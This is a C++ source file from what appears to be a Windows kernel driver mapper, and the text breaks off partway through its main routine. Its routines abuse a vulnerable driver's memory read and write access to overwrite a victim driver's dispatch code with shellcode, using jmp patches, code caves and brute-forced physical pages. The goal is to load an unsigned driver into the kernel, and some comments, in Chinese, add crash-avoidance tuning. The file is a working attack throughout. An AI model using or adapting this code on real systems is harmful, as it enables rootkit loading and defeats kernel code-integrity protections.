/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2026
*
*  TITLE:       DRVMAP.CPP
*
*  VERSION:     1.50
*
*  DATE:        19 Jul 2026
*
*  Driver mapping routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* KDUShowPayloadResult
*
* Purpose:
*
* Query and display shellcode result.
*
*/
VOID KDUShowPayloadResult(
    _In_ PKDU_CONTEXT Context,
    _In_ HANDLE SectionHandle
)
{
    NTSTATUS ntStatus;
    ULONG payloadSize = 0;
    SIZE_T viewSize;

    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    pvPayloadHead.Ref = NULL;

    ScSizeOf(Context->ShellVersion, &payloadSize);
    viewSize = ALIGN_UP_BY(payloadSize, PAGE_SIZE);

    ntStatus = NtMapViewOfSection(SectionHandle,
        NtCurrentProcess(),
        &pvPayloadHead.Ref,
        0,
        PAGE_SIZE,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_READONLY);

    if (NT_SUCCESS(ntStatus) && pvPayloadHead.Ref) {

        switch (Context->ShellVersion) {

        case KDU_SHELLCODE_V2:

            supPrintfEvent(kduEventInformation,
                "[~] Shellcode result, system worker: 0x%p\r\n",
                (PVOID)pvPayloadHead.Version.v1->IoStatus.Information);

            break;

        case KDU_SHELLCODE_V3:
        case KDU_SHELLCODE_V1:
        default:

            supPrintfEvent(kduEventInformation,
                "[~] Shellcode result: NTSTATUS (0x%lX)\r\n", pvPayloadHead.Version.v1->IoStatus.Status);

            break;
        }

        NtUnmapViewOfSection(NtCurrentProcess(), pvPayloadHead.Ref);
    }
    else {

        supPrintfEvent(kduEventError,
            "[!] Cannot map shellcode section, NTSTATUS (%lX)\r\n", ntStatus);

    }
}

/*
* KDUStorePayloadInSection
*
* Purpose:
*
* Load input file as image, resolve import and store result in shared section.
*
*/
BOOL KDUStorePayloadInSection(
    _In_ PKDU_CONTEXT Context,
    _Out_ PHANDLE SectionHandle,
    _Out_ PSIZE_T ViewSize,
    _In_ PVOID ImageBase,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    BOOL bSuccess = FALSE;
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    HANDLE sectionHandle = NULL;
    PACL defaultAcl = NULL;
    PVOID pvSharedSection = NULL, dataPtr = NULL;

    PIMAGE_NT_HEADERS ntHeader;

    UNICODE_STRING uStr;
    OBJECT_ATTRIBUTES objAttr;
    PSECURITY_DESCRIPTOR sectionSD = NULL;

    UUID secUuid;
    WCHAR szName[100];

    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    *SectionHandle = NULL;
    *ViewSize = 0;

    do {

        SIZE_T cbPayloadHead;

        switch (Context->ShellVersion) {
        case KDU_SHELLCODE_V3:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V3);
            break;
        case KDU_SHELLCODE_V2:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V2);
            break;
        case KDU_SHELLCODE_V1:
        default:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V1);
            break;
        }

        //
        // Allocate space for header per version.
        //
        pvPayloadHead.Ref = supHeapAlloc(cbPayloadHead);
        if (pvPayloadHead.Ref == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Error, payload header not allocated\r\n");

            break;
        }

        //
        // Create SD for section.
        //
        ntStatus = supCreateSystemAdminAccessSD(&sectionSD, &defaultAcl);
        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Error, shared section SD not allocated", ntStatus);
            break;
        }

        //
        // Create UUID.
        //
        if (RPC_S_OK != UuidCreate(&secUuid)) {
            supShowWin32Error("[!] Cannot allocate shared section UUID", GetLastError());
            break;
        }

        ntHeader = RtlImageNtHeader(ImageBase);

        //
        // Resolve import (ntoskrnl only).
        //
        ULONG isz = ntHeader->OptionalHeader.SizeOfImage;

        dataPtr = supHeapAlloc(isz);
        if (dataPtr) {
            RtlCopyMemory(dataPtr, ImageBase, isz);

            printf_s("[+] Resolving kernel import for input driver\r\n");
            supResolveKernelImport((ULONG_PTR)dataPtr, KernelImage, KernelBase);

        }
        else {

            supPrintfEvent(kduEventError,
                "[!] Could not allocate memory for image\r\n");

            break;
        }

        //
        // Create shared section.
        //
        RtlSecureZeroMemory(szName, sizeof(szName));
        StringCchPrintf(szName, RTL_NUMBER_OF(szName),
            L"\\BaseNamedObjects\\{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
            secUuid.Data1, secUuid.Data2, secUuid.Data3,
            secUuid.Data4[0],
            secUuid.Data4[1],
            secUuid.Data4[2],
            secUuid.Data4[3],
            secUuid.Data4[4],
            secUuid.Data4[5],
            secUuid.Data4[6],
            secUuid.Data4[7]);

        RtlInitUnicodeString(&uStr, szName);
        InitializeObjectAttributes(&objAttr, &uStr, OBJ_CASE_INSENSITIVE, NULL, sectionSD);

        LARGE_INTEGER liSectionSize;
        SIZE_T viewSize = ALIGN_UP_BY(isz + cbPayloadHead, PAGE_SIZE);

        liSectionSize.QuadPart = viewSize;
        *ViewSize = viewSize;

        ntStatus = NtCreateSection(&sectionHandle,
            SECTION_ALL_ACCESS,
            &objAttr,
            &liSectionSize,
            PAGE_READWRITE,
            SEC_COMMIT,
            NULL);

        if (!NT_SUCCESS(ntStatus)) {
            supShowHardError("[!] Error, cannot create shared section", ntStatus);
            break;
        }

        ntStatus = NtMapViewOfSection(sectionHandle,
            NtCurrentProcess(),
            &pvSharedSection,
            0,
            PAGE_SIZE,
            NULL,
            &viewSize,
            ViewUnmap,
            MEM_TOP_DOWN,
            PAGE_READWRITE);

        if (NT_SUCCESS(ntStatus)) {

            printf_s("[+] Resolving payload import\r\n");

            if (ScResolveImportForPayload(
                Context->ShellVersion,
                pvPayloadHead.Ref,
                KernelImage,
                KernelBase))
            {
                EncodeBuffer(dataPtr, isz, Context->EncryptKey);

                switch (Context->ShellVersion) {
                case KDU_SHELLCODE_V3:
                    pvPayloadHead.Version.v3->ImageSize = isz;
                    break;
                case KDU_SHELLCODE_V2:
                    pvPayloadHead.Version.v2->ImageSize = isz;
                    break;
                case KDU_SHELLCODE_V1:
                default:
                    pvPayloadHead.Version.v1->ImageSize = isz;
                    break;
                }

                //
                // This field is version independent.
                //
                pvPayloadHead.Version.v1->IoStatus.Status = STATUS_UNSUCCESSFUL;

                if (!ScStoreVersionSpecificData(Context, pvPayloadHead.Ref)) {

                    supPrintfEvent(kduEventError,
                        "[!] Error, cannot store additional data for shellcode\r\n");

                    break;
                }

                RtlCopyMemory(pvSharedSection, pvPayloadHead.Ref, cbPayloadHead);
                RtlCopyMemory(RtlOffsetToPointer(pvSharedSection, cbPayloadHead), dataPtr, isz);

                NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
                *SectionHandle = sectionHandle;
                bSuccess = TRUE;
            }
            else {

                supPrintfEvent(kduEventError,
                    "[!] Error, resolving additional import failed\r\n");

            }

        }
        else {
            supShowHardError("[!] Error, shared section not mapped", ntStatus);
        }

    } while (FALSE);

    SetLastError(RtlNtStatusToDosError(ntStatus));

    if (dataPtr) supHeapFree(dataPtr);
    if (sectionSD) supHeapFree(sectionSD);
    if (pvPayloadHead.Ref) supHeapFree(pvPayloadHead.Ref);
    if (defaultAcl) supHeapFree(defaultAcl);

    if (bSuccess == FALSE) {

        if (pvSharedSection) NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
        if (sectionHandle) NtClose(sectionHandle);

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bSuccess;
}

/*
* KDUSetupShellCode
*
* Purpose:
*
* Construct shellcode data, init code.
*
*/
PVOID KDUSetupShellCode(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase,
    _Out_ PHANDLE SectionHandle)
{
    NTSTATUS ntStatus;
    ULONG procSize = 0;
    SIZE_T viewSize = 0;
    HANDLE sectionHandle = NULL;
    UNICODE_STRING ustr;

    ULONG_PTR KernelBase, KernelImage = 0;

    PVOID pvShellCode = NULL;

    WCHAR szNtOs[MAX_PATH * 2];

    FUNCTION_ENTER_MSG(__FUNCTION__);

    *SectionHandle = NULL;

    do {

        KernelBase = Context->NtOsBase;
        if (KernelBase == 0) {

            supPrintfEvent(kduEventError,
                "[!] Cannot query ntoskrnl loaded base, abort\r\n");

            break;
        }

        printf_s("[+] Loaded ntoskrnl base 0x%llX\r\n", KernelBase);

        //
        // Preload ntoskrnl.exe
        //
        _strcpy(szNtOs, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szNtOs, L"\\system32\\ntoskrnl.exe");

        RtlInitUnicodeString(&ustr, szNtOs);
        ntStatus = LdrLoadDll(NULL, NULL, &ustr, (PVOID*)&KernelImage);

        if ((!NT_SUCCESS(ntStatus)) || (KernelImage == 0)) {
            supShowHardError("[!] Error while loading ntoskrnl.exe", ntStatus);
            break;
        }

        printf_s("[+] Ntoskrnl.exe mapped at 0x%llX\r\n", KernelImage);
        Context->NtOsMappedBase = KernelImage;

        //
        // Prepare and store payload for later shellcode use.
        //
        if (!KDUStorePayloadInSection(Context,
            &sectionHandle,
            &viewSize,
            ImageBase,
            KernelImage,
            KernelBase))
        {

            supPrintfEvent(kduEventError,
                "[!] Error while mapping payload, abort\r\n");

            break;
        }

        *SectionHandle = sectionHandle;

        //
        // Allocate shellcode.
        //
        pvShellCode = ScAllocate(Context->ShellVersion,
            sectionHandle,
            viewSize,
            KernelImage,
            KernelBase,
            Context->MemoryTag,
            &procSize);

        if (pvShellCode == NULL)
            break;

        if (procSize == 0) {

            supPrintfEvent(kduEventError,
                "[!] Unexpected shellcode procedure size, abort\r\n");

            ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));
            pvShellCode = NULL;
            break;
        }

        printf_s("[+] Bootstrap code size = 0x%lX\r\n", procSize);

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return pvShellCode;
}

/*
* KDUPagePatchCallback
*
* Purpose:
*
* Patch dispatch pages in physical memory.
*
*/
BOOL WINAPI KDUPagePatchCallback(
    _In_ ULONG_PTR Address,
    _In_ PVOID UserContext)
{
    BOOL bIoResult;
    PKDU_PHYSMEM_ENUM_PARAMS Params = (PKDU_PHYSMEM_ENUM_PARAMS)UserContext;

    provReadPhysicalMemory ReadPhysicalMemory = Params->ReadPhysicalMemory;
    provWritePhysicalMemory WritePhysicalMemory = Params->WritePhysicalMemory;

    ULONG_PTR targetAddress = 0;

    PVOID dispatchSignature = Params->DispatchSignature;
    ULONG signatureSize = Params->DispatchSignatureLength;
    ULONG dispatchPageOffset = Params->DispatchHandlerPageOffset;

    BYTE buffer[PAGE_SIZE];
    RtlSecureZeroMemory(&buffer, sizeof(buffer));

    if (ReadPhysicalMemory(Params->DeviceHandle,
        Address,
        &buffer,
        PAGE_SIZE))
    {
        if (signatureSize == RtlCompareMemory(dispatchSignature,
            RtlOffsetToPointer(buffer, dispatchPageOffset),
            signatureSize))
        {
            printf_s("\t-> Found page with code at address 0x%llX\r\n", Address);
            Params->ccPagesFound += 1;

            if ((SIZE_T)dispatchPageOffset + (SIZE_T)Params->cbPayload > PAGE_SIZE) {

                unsigned char jmpcode[] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };

                *(PULONG)&jmpcode[1] = Params->JmpAddress;

                printf_s("\t--> Setting jump[%lX][%lX] at address 0x%llX\r\n",
                    jmpcode[0],
                    *(PULONG)&jmpcode[1],
                    Address + dispatchPageOffset);

                targetAddress = Address + dispatchPageOffset;

                bIoResult = WritePhysicalMemory(Params->DeviceHandle,
                    targetAddress,
                    jmpcode,
                    sizeof(jmpcode));

                if (bIoResult) {

                    printf_s("\t--> Memory has been modified at address 0x%llX\r\n", Address + dispatchPageOffset);
                    printf_s("\t--> Overwriting page at address 0x%llX\r\n", Address);

                    targetAddress = Address;

                    bIoResult = WritePhysicalMemory(Params->DeviceHandle,
                        targetAddress,
                        Params->pvPayload,
                        Params->cbPayload);

                }

            }
            else {

                targetAddress = Address + dispatchPageOffset;

                bIoResult = WritePhysicalMemory(Params->DeviceHandle,
                    targetAddress,
                    Params->pvPayload,
                    Params->cbPayload);

            }

            if (bIoResult) {
                Params->ccPagesModified += 1;
                printf_s("\t--> Memory has been modified at address 0x%llX\r\n", targetAddress);
            }
            else {
                supPrintfEvent(kduEventError,
                    "Could not modify memory at address 0x%llX\r\n", targetAddress);
            }

        }
    }

    return FALSE;
}

/*
* KDUDriverMapInit
*
* Purpose:
*
* Allocate shellcode structure and create sync event.
*
*/
BOOL KDUDriverMapInit(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase,
    _Out_ PVOID* ShellCode,
    _Out_ PHANDLE SectionHandle,
    _Out_ PHANDLE SyncEventHandle
)
{
    PVOID pvShellCode;
    HANDLE sectionHandle = NULL, readyEventHandle;

    *ShellCode = NULL;
    *SectionHandle = NULL;
    *SyncEventHandle = NULL;

    pvShellCode = KDUSetupShellCode(Context, ImageBase, &sectionHandle);
    if (pvShellCode == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Error while building shellcode, abort\r\n");

        return FALSE;
    }

    readyEventHandle = ScCreateReadyEvent(Context->ShellVersion, pvShellCode);
    if (readyEventHandle == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Error building the ready event handle, abort\r\n");

        ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));
        
        if (sectionHandle) {
            NtClose(sectionHandle);
            sectionHandle = NULL;
        }

        return FALSE;
    }

    *ShellCode = pvShellCode;
    *SectionHandle = sectionHandle;
    *SyncEventHandle = readyEventHandle;

    return TRUE;
}

/*
* KDUpMapDriverPhysicalTranslate
*
* Purpose:
*
* Process shellcode write through physical memory address translation.
*
*/
BOOL KDUpMapDriverPhysicalTranslate(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize,
    _In_ HANDLE ScSectionHandle,
    _In_ HANDLE ReadyEventHandle,
    _In_ PVICTIM_IMAGE_INFORMATION VictimImageInformation,
    _In_ ULONG_PTR TargetAddress
)
{
    BOOL bSuccess = FALSE;
    HANDLE deviceHandle = Context->DeviceHandle;
    HANDLE victimDeviceHandle = NULL;
    KDU_PROVIDER* prov = Context->Provider;
    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;

    ULONG dispatchPageOffset = VictimImageInformation->DispatchPageOffset;
    ULONG_PTR memPage, targetAddress = TargetAddress;

    provWriteKernelVM WriteKernelVM = prov->Callbacks.WriteKernelVM;

    do {

        if ((SIZE_T)dispatchPageOffset + (SIZE_T)ScSize > PAGE_SIZE) {

            memPage = (TargetAddress & 0xfffffffffffff000ull);
            printf_s("[~] Shellcode overlaps page boundary, switching target memory address to 0x%llX\r\n", memPage);

            unsigned char jmpcode[] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };

            *(PULONG)&jmpcode[1] = VictimImageInformation->JumpValue;

            printf_s("\t>> Setting jump[%lX][%lX] at address 0x%llX\r\n",
                jmpcode[0],
                *(PULONG)&jmpcode[1],
                TargetAddress);

            if (!WriteKernelVM(deviceHandle, TargetAddress, &jmpcode, sizeof(jmpcode))) {

                supPrintfEvent(kduEventError,
                    "[!] Error writting kernel memory, abort\r\n");

                break;

            }
            else {

                targetAddress = TargetAddress - dispatchPageOffset;

            }

        }

        //
        // Write shellcode to kernel.
        //
        printf_s("[+] Writing shellcode at 0x%llX address with size 0x%lX\r\n", targetAddress, ScSize);

        if (!WriteKernelVM(deviceHandle, targetAddress, ScBuffer, ScSize)) {

            supPrintfEvent(kduEventError,
                "[!] Error writting kernel memory, abort\r\n");
            break;
        }

        //
        // Read the payload back before executing it.
        //
        // A partial or misplaced write would otherwise be executed as code, which on
        // newer NT builds shows up as an illegal instruction or divide error inside
        // the victim instead of a clean failure. Verify first, execute second.
        //
        {
            PVOID verifyBuffer = supHeapAlloc(ScSize);

            if (verifyBuffer) {

                if (prov->Callbacks.ReadKernelVM(deviceHandle, targetAddress, verifyBuffer, ScSize) &&
                    RtlCompareMemory(verifyBuffer, ScBuffer, ScSize) != ScSize) {

                    supPrintfEvent(kduEventError,
                        "[!] Shellcode readback mismatch at 0x%llX, refusing to execute\r\n",
                        targetAddress);

                    supHeapFree(verifyBuffer);
                    break;
                }

                supHeapFree(verifyBuffer);
            }
        }

        //
        // Execute shellcode.
        //
        printf_s("[+] Executing shellcode\r\n");
        VpExecutePayload(victimProv, &victimDeviceHandle);

        //
        // Wait for the shellcode to trigger the event
        //
        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {

            supPrintfEvent(kduEventError,
                "[!] Shellcode did not trigger the event within two seconds.\r\n");

        }
        else
        {
            KDUShowPayloadResult(Context, ScSectionHandle);
            bSuccess = TRUE;
        }

    } while (FALSE);

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    return bSuccess;
}

/*
* KDUpMapDriverPhysicalBruteForce
*
* Purpose:
*
* Process shellcode write through physical memory bruteforce.
*
*/
BOOL KDUpMapDriverPhysicalBruteForce(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize,
    _In_ HANDLE ScSectionHandle,
    _In_ HANDLE ReadyEventHandle,
    _In_ PKDU_PHYSMEM_ENUM_PARAMS EnumParams
)
{
    BOOL bSuccess = FALSE;
    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
    HANDLE victimDeviceHandle = NULL;

    EnumParams->bWrite = TRUE;
    EnumParams->ccPagesFound = 0;
    EnumParams->ccPagesModified = 0;
    EnumParams->pvPayload = ScBuffer;
    EnumParams->cbPayload = ScSize;

    supPrintfEvent(kduEventInformation,
        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);

    if (supEnumeratePhysicalMemory(KDUPagePatchCallback, EnumParams)) {

        printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
            EnumParams->ccPagesFound,
            EnumParams->ccPagesModified);

        //
        // Execute shellcode.
        //
        printf_s("[+] Executing shellcode\r\n");
        VpExecutePayload(victimProv, &victimDeviceHandle);

        //
        // Wait for the shellcode to trigger the event
        //
        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {

            supPrintfEvent(kduEventError,
                "[!] Shellcode did not trigger the event within two seconds.\r\n");

        }
        else
        {
            KDUShowPayloadResult(Context, ScSectionHandle);
            bSuccess = TRUE;
        }

    }
    else {
        supPrintfEvent(kduEventError,
            "[!] Failed to enumerate physical memory.\r\n");

    }

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    return bSuccess;
}

/*
* KDUpFindCodeCave
*
* Purpose:
*
* Find a run of padding bytes inside the victim image .text section that is large
* enough for the shellcode and does not cross a page boundary.
*
* Rationale: KDUpMapDriverDirectVM used to place the shellcode right at the victim
* dispatch entry. The shellcode is a few hundred bytes long, so it overwrote the
* neighbouring function; opening the victim device then executed the clobbered code
* and raised #UD/#DE inside the victim before the stager ever ran. Placing the stager
* in a cave and putting a 5-byte jmp at the entry keeps the rest of the image intact.
*
*/
static BOOL KDUpFindCodeCave(
    _In_ PVOID ImageBase,
    _In_ ULONG NeedSize,
    _Out_ PULONG CaveOffset
)
{
    ULONG sectionSize = 0;
    PBYTE section;

    *CaveOffset = 0;
    if (!ImageBase || NeedSize == 0) return FALSE;

    section = (PBYTE)ntsupLookupImageSectionByName(
        (CHAR*)TEXT_SECTION,
        TEXT_SECTION_LENGTH,
        ImageBase,
        &sectionSize);

    if (!section || sectionSize < NeedSize) return FALSE;

    /* Prefer 0xCC padding (int3 fill); accept 0x00 runs as a weaker fallback. */
    for (ULONG pass = 0; pass < 2; ++pass) {

        BYTE filler = (pass == 0) ? 0xCC : 0x00;
        ULONG run = 0, runStart = 0;

        for (ULONG i = 0; i < sectionSize; ++i) {

            if (section[i] == filler) {

                if (run == 0) runStart = i;
                ++run;

                if (run >= NeedSize) {

                    ULONG rva = (ULONG)((PBYTE)(section + runStart) - (PBYTE)ImageBase);

                    if (((rva & 0xFFF) + NeedSize) <= PAGE_SIZE) {
                        *CaveOffset = rva;
                        return TRUE;
                    }

                    run = 0;
                }
            }
            else {
                run = 0;
            }
        }
    }

    return FALSE;
}

/*
* KDUpMapDriverDirectVM
*
* Purpose:
*
* Process shellcode write through direct virtual memory write primitive.
*
*/
BOOL KDUpMapDriverDirectVM(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize,
    _In_ HANDLE ScSectionHandle,
    _In_ HANDLE ReadyEventHandle,
    _In_ ULONG_PTR TargetAddress,
    _In_ ULONG_PTR StagerAddress
)
{
    BOOL bSuccess = FALSE;
    KDU_PROVIDER* prov = Context->Provider;
    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
    HANDLE victimDeviceHandle = NULL;

    /*
     * 先把要被覆盖的原始字节读出来。stager 没能接管控制权时（例如 2 秒内没有信号），
     * victim 的创建路径会继续往下执行，撞上被覆盖的邻居函数就是在内核里 AV/UD 蓝屏。
     * 保留原始字节并在失败路径写回去，可以把"蓝屏"降级成"干净失败"。
     */
    PVOID originalBytes = supHeapAlloc(ScSize);
    BOOL haveOriginal = FALSE;

    if (originalBytes &&
        prov->Callbacks.ReadKernelVM(Context->DeviceHandle, TargetAddress, originalBytes, ScSize)) {
        haveOriginal = TRUE;
    }

    //
    // Write shellcode to the cave (or straight to the entry when no cave was found).
    //
    if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
        StagerAddress,
        ScBuffer,
        ScSize))
    {

        supPrintfEvent(kduEventError,
            "[!] Error writing shellcode to the target driver, abort\r\n");

    }
    else {

        BOOL prepared = TRUE;

        if (StagerAddress != TargetAddress) {

            //
            // Patch the victim entry with a 5-byte jmp to the stager. Only these five
            // bytes are changed, so neighbouring functions stay intact.
            //
            BYTE jmpcode[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };

            *(LONG*)&jmpcode[1] = (LONG)(StagerAddress - TargetAddress - 5);

            printf_s("[+] Patching victim entry 0x%llX -> stager 0x%llX (jmp rel32 %ld)\r\n",
                TargetAddress,
                StagerAddress,
                *(LONG*)&jmpcode[1]);

            if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
                TargetAddress,
                &jmpcode,
                sizeof(jmpcode)))
            {
                supPrintfEvent(kduEventError,
                    "[!] Error patching victim entry point, abort\r\n");
                prepared = FALSE;
            }
        }

        //
        // Verify both writes landed as intended before handing control to the victim.
        //
        if (prepared) {

            PVOID verifyBuffer = supHeapAlloc(ScSize);

            if (verifyBuffer) {

                if (!prov->Callbacks.ReadKernelVM(Context->DeviceHandle, StagerAddress, verifyBuffer, ScSize) ||
                    RtlCompareMemory(verifyBuffer, ScBuffer, ScSize) != ScSize) {

                    supPrintfEvent(kduEventError,
                        "[!] Shellcode readback mismatch at 0x%llX, refusing to execute\r\n",
                        StagerAddress);

                    supHeapFree(verifyBuffer);
                    prepared = FALSE;
                }

                supHeapFree(verifyBuffer);
            }
        }

        if (prepared) {

            printf_s("[+] Driver handler code modified\r\n");

            //
            // Execute shellcode.
            //
            printf_s("[+] Executing shellcode\r\n");
            VpExecutePayload(victimProv, &victimDeviceHandle);

            //
            // Wait for the shellcode to trigger the event
            //
            if (WaitForSingleObject(ReadyEventHandle, 5000) != WAIT_OBJECT_0) {

                supPrintfEvent(kduEventError,
                    "[!] Shellcode did not trigger the event within five seconds.\r\n");

                /*
                 * 超时也要读一次共享节：shellcode 在失败时同样会把 NTSTATUS 写进
                 * PAYLOAD_HEADER，这是判断"它到底跑到哪一步"的唯一窗口。
                 */
                printf_s("[!] Payload result as left by the shellcode:\r\n");
                KDUShowPayloadResult(Context, ScSectionHandle);

            }
            else
            {
                KDUShowPayloadResult(Context, ScSectionHandle);
                bSuccess = TRUE;
            }
        }
    }

    //
    // 失败时把 victim 的原始字节写回去，避免创建路径继续执行到被覆盖的邻居函数。
    //
    if (!bSuccess && haveOriginal) {

        if (prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
            TargetAddress,
            originalBytes,
            ScSize))
        {
            printf_s("[+] Victim bytes restored after failure\r\n");
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Could not restore victim bytes, expect instability\r\n");
        }
    }

    if (originalBytes) supHeapFree(originalBytes);

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    return bSuccess;
}

/*
* KDUMapDriver
*
* Purpose:
*
* Run mapper.
*
*/
BOOL KDUMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase)
{
    BOOL bSuccess = FALSE;
    ULONG_PTR targetAddress = 0;
    PVOID pvShellCode = NULL;

    KDU_VICTIM_PROVIDER* victimProv;

    VICTIM_IMAGE_INFORMATION vi;
    VICTIM_DRIVER_INFORMATION vdi;
    KDU_PHYSMEM_ENUM_PARAMS enumParams;
    VICTIM_LOAD_PARAMETERS viLoadParams;

    ULONG dispatchOffset = 0;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    victimProv = Context->Victim;

    do {

        viLoadParams.Provider = victimProv;

        //
        // Load victim driver.
        //
        if (VpCreate(victimProv,
            Context->ModuleBase,
            NULL,
            VpLoadDriverCallback,
            &viLoadParams))
        {
            printf_s("[+] Successfully loaded victim driver\r\n");
        }
        else {
            supShowWin32Error("[!] Cannot load victim target", GetLastError());
            break;
        }

        //
        // Query all required victim information.
        //
        RtlSecureZeroMemory(&vi, sizeof(vi));

        printf_s("[+] Query victim image information\r\n");

        if (VpQueryInformation(
            Context->Victim,
            VictimImageInformation,
            &vi,
            sizeof(vi)))
        {
            dispatchOffset = vi.DispatchOffset;

            /*
             * 可选：直接用调用方给出的派发 RVA 覆盖签名匹配结果。
             *
             * 签名匹配的是"函数特征字节"，victim 换版本后它会命中别的函数；那时 stager
             * 被写到错误位置，打开设备时执行的是未被跳转覆盖的路径，却撞上被覆盖的邻居
             * 函数，表现为 victim 内 #UD/#DE。用真实的 IRP_MJ_CREATE 派发 RVA 可以避开
             * 这个猜测（victim-scout 工具负责算出这个值）。
             */
            if (Context->ArbitraryData != 0) {

                ULONG override_rva = (ULONG)Context->ArbitraryData;

                printf_s("[+] Victim dispatch RVA override: 0x%lX (signature said 0x%lX)\r\n",
                    override_rva,
                    dispatchOffset);

                dispatchOffset = override_rva;
                vi.DispatchOffset = override_rva;
                vi.DispatchPageOffset = override_rva & 0xfff;
            }

            RtlSecureZeroMemory(&vdi, sizeof(vdi));

            printf_s("[+] Query victim loaded driver layout\r\n");

            if (VpQueryInformation(
                Context->Victim,
                VictimDriverInformation,
                &vdi,
                sizeof(vdi)))
            {

                /*
                 * 补丁地址必须落在 victim 镜像内。
                 *
                 * DispatchOffset 一旦算错（例如按指针低位截断），targetAddress 会指到
                 * 镜像之外的内存；把 shellcode 写到那里再执行，在启用了 NX 池的系统上
                 * 就是 0xFC ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY，直接蓝屏。
                 * 与其跳到未知地址，不如在这里停下来并把实际数值打出来。
                 */
                printf_s("[+] Victim layout: base 0x%llX size 0x%lX, dispatch offset 0x%lX\r\n",
                    vdi.LoadedImageBase,
                    vdi.ImageSize,
                    dispatchOffset);

                if (vdi.ImageSize == 0 || dispatchOffset >= vdi.ImageSize) {

                    supPrintfEvent(kduEventError,
                        "[!] Dispatch offset 0x%lX outside victim image (size 0x%lX), abort\r\n",
                        dispatchOffset,
                        vdi.ImageSize);

                    break;
                }

                targetAddress = vdi.LoadedImageBase + dispatchOffset;

            }
            else {
                supShowWin32Error("[!] Cannot query victim driver layout", GetLastError());
                break;
            }

        }
        else
        {
            supShowWin32Error("[!] Cannot query victim image information", GetLastError());
            break;
        }

        printf_s("[+] Victim target address 0x%llX\r\n", targetAddress);

        HANDLE sectionHandle = NULL, readyEventHandle = NULL;

        //
        // Prepare shellcode, signal event and shared section.
        //
        if (!KDUDriverMapInit(Context,
            ImageBase,
            &pvShellCode,
            &sectionHandle,
            &readyEventHandle))
        {
            break;
        }

        ULONG cbShellCode = ScSizeOf(Context->ShellVersion, NULL);

        //
        // Select proper handling depending on exploitable driver type.
        //
        if (Context->Provider->LoadData->PhysMemoryBruteForce) {

            //
            // 1. Physical memory mapping via MmMapIoSpace(Ex)
            //
            RtlSecureZeroMemory(&enumParams, sizeof(enumParams));

            enumParams.DeviceHandle = Context->DeviceHandle;
            enumParams.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
            enumParams.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;

            enumParams.DispatchSignature = Context->Victim->Data.DispatchSignature;
            enumParams.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;

            enumParams.DispatchHandlerOffset = vi.DispatchOffset;
            enumParams.DispatchHandlerPageOffset = vi.DispatchPageOffset;
            enumParams.JmpAddress = vi.JumpValue;

            bSuccess = KDUpMapDriverPhysicalBruteForce(Context,
